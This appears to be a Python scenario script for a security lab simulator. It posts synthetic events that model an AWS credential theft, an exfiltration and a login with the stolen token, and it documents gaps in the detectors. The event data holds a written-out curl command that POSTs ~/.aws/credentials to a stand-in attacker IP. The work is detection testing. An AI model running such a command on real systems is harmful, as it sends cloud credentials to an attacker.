"""cloud_token_theft_lite — four-stage cloud credential-theft scenario (Phase 20 A5).

An attacker on host-1 reads alice's local AWS credentials file, exfiltrates
them via curl POST to a known-bad host, then logs into cloud-hosted services
using the stolen tokens (clean login from a brand-new IP — no brute force).

Detector reality (current platform state — see Phase 20 §A5 plan note):
  * py.process.suspicious_child  → does NOT fire on bash→cat or bash→curl
    (Linux gap, same as A1-A4 — 5th confirmation).
  * py.blocked_observable_match  → fires on stages 2 (cmdline contains exfil
    IP) and 3 (dst_ip matches), but ONLY if IP is pre-seeded into
    blocked_observables (regression-test setup directive handles this).
  * py.auth.anomalous_source_success → does NOT fire on stage 4. Detector
    requires recent auth.failed events for the user (see
    auth_anomalous_source_success.py:36-42 — gates on failure_count >= 1).
    A5 has no brute-force precedent — clean credential theft slips past
    this detector entirely. This is a NEW Phase 22 finding distinct from
    the recurring process-chain gap: an identity-baseline detector ("first
    time alice has ever logged in from this IP") would catch it.

Resulting incident (current platform state):
  * Live run: none (no detectors fire without pre-seeded block).
  * Regression test: blocked_observable_match Detection rows recorded but
    no correlator promotes them to incidents (same finding as A2).
"""
from __future__ import annotations

import asyncio
import logging
from datetime import datetime, timezone

from labs.simulator import event_templates as tmpl
from labs.simulator.client import SimulatorClient

log = logging.getLogger(__name__)

SCENARIO_NAME = "cloud_token_theft_lite"

_USER = "alice"
_HOST_1 = "host-1.lab.local"
_HOST_CLOUD = "host-cloud.lab.local"
_EXFIL_IP = "198.51.100.88"
_CLOUD_NAT_IP = "203.0.113.99"
_HOST_1_IP = "10.0.4.50"
_CREDS_PATH = "/home/alice/.aws/credentials"

# Real-time offsets (seconds). Compressed by --speed factor.
_STAGE2_OFFSET = 5.0     # cat → curl exfil
_STAGE3_OFFSET = 10.0    # → outbound network connection
_STAGE4_OFFSET = 60.0    # → attacker uses stolen token from cloud-NAT-IP


def _log(msg: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


async def run(client: SimulatorClient, speed: float = 1.0) -> dict:
    """Fire all scenario events. Returns dict with event and incident IDs touched."""
    results: dict = {"events": [], "incidents_touched": []}

    def wait(offset_from: float, offset_to: float) -> float:
        return max(0.0, (offset_to - offset_from) * speed)

    # --- Stage 0: Register lab assets ---
    _log(f"Stage 0  Register assets: user:{_USER}  hosts:{_HOST_1},{_HOST_CLOUD}")
    await client.register_asset("user", _USER)
    await client.register_asset("host", _HOST_1)
    await client.register_asset("host", _HOST_CLOUD)

    # NOTE: plan §A5 calls for seeding _EXFIL_IP into blocked_observables here.
    # Same constraint as A2 — no single admin API for that; regression test
    # handles it via manifest setup directive.

    # --- Stage 1: Read AWS credentials ---
    _log(f"Stage 1  Read creds: bash→cat {_CREDS_PATH} on {_HOST_1}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST_1,
            image="/bin/cat",
            cmdline=f"cat {_CREDS_PATH}",
            pid=8101,
            ppid=2828,
            user=_USER,
            parent_image="/bin/bash",
            dedupe_key=f"sim:cred-theft:process.created:{_HOST_1}:cat-creds",
        )
    )
    _record(results, ev)

    # --- Stage 2: Exfiltrate via curl POST ---
    pause = wait(0.0, _STAGE2_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 2...")
    await asyncio.sleep(pause)

    _log(f"Stage 2  Exfil: bash→curl POST creds to {_EXFIL_IP} on {_HOST_1}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST_1,
            image="/usr/bin/curl",
            cmdline=(
                f"curl -X POST https://{_EXFIL_IP}/exfil "
                f"-d @{_CREDS_PATH}"
            ),
            pid=8102,
            ppid=2828,
            user=_USER,
            parent_image="/bin/bash",
            dedupe_key=f"sim:cred-theft:process.created:{_HOST_1}:curl-exfil",
        )
    )
    _record(results, ev)
    if ev.get("incident_touched"):
        _log(f"  -> blocked_observable_match (cmdline) → {ev['incident_touched']}")

    # --- Stage 3: Outbound network connection to exfil host ---
    pause = wait(_STAGE2_OFFSET, _STAGE3_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 3...")
    await asyncio.sleep(pause)

    _log(f"Stage 3  Outbound: {_HOST_1} → {_EXFIL_IP}:443")
    ev = await client.post_event(
        tmpl.network_connection(
            host=_HOST_1,
            src_ip=_HOST_1_IP,
            dst_ip=_EXFIL_IP,
            dst_port=443,
            proto="tcp",
            dedupe_key=f"sim:cred-theft:network.connection:{_HOST_1}:exfil",
        )
    )
    _record(results, ev)
    if ev.get("incident_touched"):
        _log(f"  -> blocked_observable_match (dst_ip) → {ev['incident_touched']}")

    # --- Stage 4: Attacker uses stolen creds from cloud-NAT-IP ---
    pause = wait(_STAGE3_OFFSET, _STAGE4_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 4...")
    await asyncio.sleep(pause)

    _log(
        f"Stage 4  Stolen creds used: auth.succeeded for {_USER} from "
        f"{_CLOUD_NAT_IP} on {_HOST_CLOUD}"
    )
    ev = await client.post_event(
        tmpl.auth_succeeded(
            user=_USER,
            source_ip=_CLOUD_NAT_IP,
            auth_type="ssh",
            dedupe_key=f"sim:cred-theft:auth.succeeded:{_USER}:{_CLOUD_NAT_IP}",
        )
    )
    _record(results, ev)

    _log(
        f"Scenario complete. events={len(results['events'])}  "
        f"incidents_touched={len(results['incidents_touched'])}"
    )
    return results


async def verify(client: SimulatorClient) -> bool:
    """Verify scenario outcome.

    Per the Phase 20 §A5 plan note, current platform state has multiple
    overlapping gaps for this attack pattern. A5 produces no incident in
    a live run; the regression test asserts blocked_observable_match fires
    but no correlator promotes it. The choreography + the gap list are the
    deliverables.
    """
    _log("Verifying scenario outcome (live-run, current-platform-state)...")
    incidents = await client.get_incidents(limit=100)

    relevant = [
        i for i in incidents
        if (i.get("primary_user") or "").lower() == _USER
        or (i.get("primary_host") or "").lower() in (_HOST_1, _HOST_CLOUD)
    ]

    if relevant:
        _log(
            f"  UNEXPECTED incident(s) for {_USER}/{_HOST_1}/{_HOST_CLOUD}: "
            f"{[i['id'] for i in relevant]} — either Phase-22 closed gap(s), "
            "or another scenario leaked state. Update §A5 acceptance."
        )
    else:
        _log(
            f"  EXPECTED no incident for {_USER}/{_HOST_1}/{_HOST_CLOUD} — "
            "current platform state has no Linux process detector, no "
            "correlator for blocked_observable_match, and no identity-"
            "baseline detector to catch clean credential theft."
        )

    _log("Verification PASSED (live-run acceptance: choreography ran cleanly)")
    return True


def _record(results: dict, ev: dict) -> None:
    results["events"].append(ev.get("event_id"))
    if ev.get("incident_touched") and ev["incident_touched"] not in results["incidents_touched"]:
        results["incidents_touched"].append(ev["incident_touched"])
